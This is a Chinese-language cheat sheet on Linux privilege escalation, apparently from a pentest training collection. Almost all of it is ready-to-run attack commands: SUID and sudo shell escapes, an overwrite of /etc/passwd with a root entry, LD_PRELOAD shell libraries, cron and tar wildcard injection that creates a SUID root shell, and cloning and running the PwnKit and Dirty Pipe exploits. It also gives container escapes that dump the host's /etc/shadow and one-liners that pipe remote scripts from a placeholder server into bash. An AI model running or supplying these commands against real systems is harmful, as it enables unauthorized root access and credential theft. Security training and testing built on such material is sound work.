---
id: 04-001
title: "🐧 Linux权限提升 (Linux Privilege Escalation)"
category: 权限提升
category_en: "Privilege Escalation"
difficulty: ★★★
tools: "LinPEAS, Linux Exploit Suggester, GTFO Bins"
last_updated: 2025-07
tags: ["privilege-escalation", "linux-privilege", "windows-privilege", "credential-theft"]
subdomain: privilege-escalation
nist_csf: ["PR.AC-01", "DE.CM-04"]
mitre_attack: ["T1068", "T1548", "T1055", "T1003"]
---
# 🐧 Linux权限提升 (Linux Privilege Escalation)

## 概述
Linux系统中的权限提升技术，利用内核漏洞、配置错误、SUID/SGID、特权滥用等方式从普通用户提升到root权限。

## 核心技能

### 1. 信息收集与枚举

```bash
# 系统信息
uname -a                                    # 内核版本
cat /etc/os-release                         # OS版本
cat /etc/issue                              # 发行版信息
hostname                                    # 主机名
cat /proc/version                           # 内核编译信息
getconf LONG_BIT                            # 系统位数

# 用户信息
id                                          # 当前用户
whoami                                      # 当前用户名
cat /etc/passwd | grep -E "/bin/bash|/bin/sh"  # 可登录用户
cat /etc/shadow 2>/dev/null                 # 密码哈希（需要root）
sudo -l                                     # sudo权限
cat /etc/sudoers 2>/dev/null                # sudo配置
lastlog                                     # 用户登录记录
history                                     # 命令历史
env                                         # 环境变量

# 自动化枚举脚本
# LinEnum
wget http://YOUR_SERVER/LinEnum.sh && bash LinEnum.sh

# LinPEAS
curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Linux Smart Enumeration
wget http://YOUR_SERVER/lse.sh && bash lse.sh

# unix-privesc-check
unix-privesc-check standard 2>&1 | tee privesc_check.txt
```

### 2. SUID/SGID提权

```bash
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 查找SGID文件
find / -perm -2000 -type f 2>/dev/null

# 查找SUID+SGID文件
find / -perm -6000 -type f 2>/dev/null

# 检查GTFOBins中的SUID利用
# GTFOBins: https://gtfobins.github.io/

# 常见SUID提权
# find
find / -exec "whoami" \;
find . -exec /bin/sh -p \; -quit

# nmap (旧版本有交互模式)
nmap --interactive
nmap> !sh

# vim
vim -c ':!/bin/bash'

# bash
bash -p  # 保留SUID权限

# less
less /etc/passwd
!/bin/sh

# cp (覆盖passwd)
cp /etc/passwd /tmp/passwd.bak
openssl passwd -1 -salt test newpassword
echo "root:\$1\$test\$xxxxx:0:0:root:/root:/bin/bash" > /tmp/passwd
cp /tmp/passwd /etc/passwd

# base64 (读取文件)
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```

### 3. Sudo权限滥用

```bash
# 查看sudo权限
sudo -l

# 常见sudo提权
# 允许无密码运行某程序时：
# python
sudo python -c 'import os; os.system("/bin/bash")'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# find
sudo find / -exec /bin/bash \;

# sed
sudo sed -n '1e exec sh 1>&0' /etc/passwd

# man
sudo man man
!/bin/bash

# gdb
sudo gdb -nx -ex 'python import os; os.system("/bin/bash")' -ex quit

# perl
sudo perl -e 'exec "/bin/bash"'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# tcpdump
sudo tcpdump -i lo -w /tmp/exploit.pcap 'icmp'
# 另开终端: ping -c 1 127.0.0.1
# 解析: tcpdump -r /tmp/exploit.pcap

# 使用LD_PRELOAD（如果env_keep+=LD_PRELOAD）
echo 'void __attribute__((constructor)) init() { system("/bin/bash"); }' > shell.c
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/some-command
```

### 4. 内核漏洞提权

```bash
# 内核版本检测
uname -r
uname -a

# 常用内核漏洞
# CVE-2016-5195 (Dirty Cow) - Linux 2.6.22 - 4.8
# CVE-2021-4034 (PwnKit) - pkexec 提权
# CVE-2022-0847 (Dirty Pipe) - Linux 5.8 - 5.16
# CVE-2023-2640 / CVE-2023-3266 (GameOverlay) - Ubuntu内核

# 使用searchsploit搜索
searchsploit linux kernel [version] privilege escalation
searchsploit linux kernel 5.10

# PwnKit利用 (CVE-2021-4034)
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make
./cve-2021-4034

# Dirty Pipe (CVE-2022-0847)
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
./compile.sh
./exploit

# 使用Linux Exploit Suggester
git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git
cd linux-exploit-suggester
./linux-exploit-suggester.sh

# 使用LES (Linux Exploit Suggester 2)
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl
```

### 5. 计划任务/Cron滥用

```bash
# 查看计划任务
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/

# 查看用户计划任务
crontab -l

# 检查可写的计划任务脚本
find /etc/cron* -writable -type f 2>/dev/null

# 如果某个计划任务脚本可写：
echo '#!/bin/bash' > /etc/cron.daily/backup
echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' >> /etc/cron.daily/backup
# 等待cron执行后: /tmp/rootbash -p

# 如果PATH被滥用，创建一个同名程序
echo '#!/bin/bash' > /tmp/tar
echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
# 等待cron执行tar时调用我们的恶意程序

# 通配符注入
# 如果计划任务执行类似: tar czf /backup/backup.tar.gz *
cd /tmp
echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' > run.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh run.sh"
```

### 6. 环境变量与通配符攻击

```bash
# 通配符滥用（Wildcard Injection）
# chown * (使用--reference)
touch -- "--reference=/etc/shadow"
touch testfile
chown * testfile  # 实际: chown --reference=/etc/shadow testfile

# chmod * (使用--reference)
touch -- "--reference=/etc/shadow"
chmod * testfile

# rsync * 
touch -- "-e sh shell.sh"
rsync -a * .

# 目录创建攻击
# 如果脚本执行: cd /tmp && zip backup.zip *
mkdir exploit
cd exploit
ln -s /etc/passwd linkfile
zip --symlinks backup.zip *  # 打包包含passwd

# LD_PRELOAD攻击
# 如果系统有SUID程序
echo 'void init() { setgid(0); setuid(0); system("/bin/bash"); }' > shell.c
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=./shell.so /usr/sbin/apache2  # 更换为已知SUID程序
```

### 7. Docker/LXC容器逃逸

```bash
# 检查是否在容器中
cat /proc/1/cgroup | grep -i docker
cat /proc/1/environ | grep -i container

# 如果docker.sock可用
ls -la /var/run/docker.sock

# 挂载宿主机根目录
docker run -v /:/host -it alpine chroot /host /bin/bash

# 特权容器逃逸
# 使用nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# 使用capsh
capsh --print  # 查看capabilities
# 如果有SYS_ADMIN
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd
echo 'cat /etc/shadow > $host_path/shadow_output' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
cat /shadow_output
```

## 权限提升检查清单

| 检查项 | 命令/方法 |
|:---|:---|
| SUID/SGID | `find / -perm -4000 -type f 2>/dev/null` |
| Sudo权限 | `sudo -l` |
| 可写脚本 | `find / -writable -type f 2>/dev/null` |
| 内核版本 | `uname -r` |
| Cron任务 | `cat /etc/crontab` |
| Docker特权 | `cat /proc/1/cgroup` |
| Capabilities | `getcap -r / 2>/dev/null` |
| NFS挂载 | `cat /etc/exports 2>/dev/null` |
| 密码复用 | `find . -type f -name "*.txt" -o -name "*.conf" \| xargs grep -i password` |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| LinPEAS | Linux提权枚举 | https://github.com/carlospolop/PEASS-ng |
| Linux Exploit Suggester | 内核漏洞检测 | https://github.com/mzet-/linux-exploit-suggester |
| GTFOBins | SUID/Sudo绕过 | https://gtfobins.github.io/ |
| PsPy | 进程监控 | https://github.com/DominicBreuker/pspy |

## 参考资源
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation)
- [Linux Privilege Escalation - Tib3rius](https://github.com/Tib3rius/Privilege-Escalation-Awesome)
